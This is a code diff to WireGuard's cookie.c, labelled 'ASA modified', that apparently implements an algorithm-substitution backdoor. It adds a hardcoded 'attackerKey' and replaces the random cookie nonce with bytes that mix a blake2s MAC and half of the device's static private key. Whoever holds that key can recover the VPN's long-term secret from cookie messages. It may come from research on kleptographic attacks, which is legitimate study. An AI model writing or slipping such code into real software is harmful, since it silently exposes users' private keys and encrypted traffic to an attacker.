diff --git a/src/cookie.c b/src/cookie.c
index 8b7d1fe..c04e6ff 100644
--- a/src/cookie.c
+++ b/src/cookie.c
@@ -16,6 +16,12 @@
 #include <net/ipv6.h>
 #include <crypto/algapi.h>
 
+//******** ASA modified **********************************************************************************************//
+#define IV_REPLACEMENT_IN_COOKIE
+const u8 attackerKey[16] = {0x12, 0x23, 0x34, 0x45, 0x56, 0x67, 0x78, 0x89,
+                               0x99, 0x9a, 0xab, 0xbc, 0xcd, 0xde, 0xef, 0xff};
+//********************************************************************************************************************//
+
 void wg_cookie_checker_init(struct cookie_checker *checker,
 			    struct wg_device *wg)
 {
@@ -181,13 +187,32 @@ void wg_cookie_message_create(struct message_handshake_cookie *dst,
 			      struct sk_buff *skb, __le32 index,
 			      struct cookie_checker *checker)
 {
+#ifdef IV_REPLACEMENT_IN_COOKIE
+    //******** ASA modified ******************************************************************************************//
+	u32 counter;
+    //****************************************************************************************************************//
+#endif
+
 	struct message_macs *macs = (struct message_macs *)
 		((u8 *)skb->data + skb->len - sizeof(*macs));
 	u8 cookie[COOKIE_LEN];
 
 	dst->header.type = cpu_to_le32(MESSAGE_HANDSHAKE_COOKIE);
 	dst->receiver_index = index;
+
+#ifdef IV_REPLACEMENT_IN_COOKIE
+    //******** ASA modified ******************************************************************************************//
+    get_random_bytes_wait(dst->nonce, 8); // 64 random bits
+    blake2s(&dst->nonce[8], dst->nonce, attackerKey, 16, 8, 16);
+    for(counter = 0; counter < 16; counter++)
+    {
+        dst->nonce[8 + counter] ^= checker->device->static_identity.static_private[((dst->nonce[0] & 0x1) * 16) + counter];
+    }
+#else
+    //******* Original code ******************************************************************************************//
     get_random_bytes_wait(dst->nonce, COOKIE_NONCE_LEN);
+    //****************************************************************************************************************//
+#endif
 
 	make_cookie(cookie, skb, checker);
 	xchacha20poly1305_encrypt(dst->encrypted_cookie, cookie, COOKIE_LEN,
